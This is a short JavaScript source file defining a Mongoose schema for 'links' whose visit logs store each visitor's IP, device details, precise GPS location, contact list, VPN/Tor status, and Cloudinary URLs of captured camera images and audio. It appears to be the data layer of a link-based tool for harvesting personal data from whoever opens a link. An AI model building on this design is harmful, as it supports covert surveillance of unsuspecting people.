const mongoose = require('mongoose');

const linkSchema = new mongoose.Schema({
    title: {
        type: String,
        required: true,
        trim: true
    },
    pageId: {
        type: String,
        required: true,
        unique: true
    },
    number: {
        type: Number,
        unique: true,
        sparse: true // Allows null/undefined but ensures uniqueness when present
    },
    url: {
        type: String,
        // formatted url for display/storage purposes
    },
    logs: [{
        timestamp: String,
        request: {
            ip: String,
            rawIp: String,
            referrer: String,
            userAgent: String
        },
        device: {
            browser: String,
            os: String,
            device: String,
            deviceVendor: String,
            deviceType: String
        },
        clientData: Object, // Store raw frontend data (expo-device)
        permissions: {
            location: String,
            cameraview: String,
            contacts: String,
            media: String,
            notification: String
        },
        location: {
            latitude: Number,
            longitude: Number,
            altitude: Number,
            accuracy: Number,
            heading: Number,
            speed: Number,
            timestamp: Number
        },
        contacts: Array, // Array of contact objects
        network: {
            ip: String,
            location: {
                city: String,
                region: String,
                country: String,
                continent: String,
                region_code: String,
                country_code: String,
                continent_code: String,
                latitude: String,
                longitude: String,
                time_zone: String,
                locale_code: String,
                metro_code: String,
                is_in_european_union: Boolean
            },
            network: {
                network: String,
                autonomous_system_number: String,
                autonomous_system_organization: String
            },
            security: {
                vpn: Boolean,
                proxy: Boolean,
                tor: Boolean,
                relay: Boolean
            },
            is_private: Boolean // For localhost/private IP handling
        },
        captures: {
            image: String, // Cloudinary URL for image
            audio: String  // Cloudinary URL for audio
        }
    }],
    createdAt: {
        type: Date,
        default: Date.now
    }
});

const Link = mongoose.model('Link', linkSchema);
module.exports = Link;
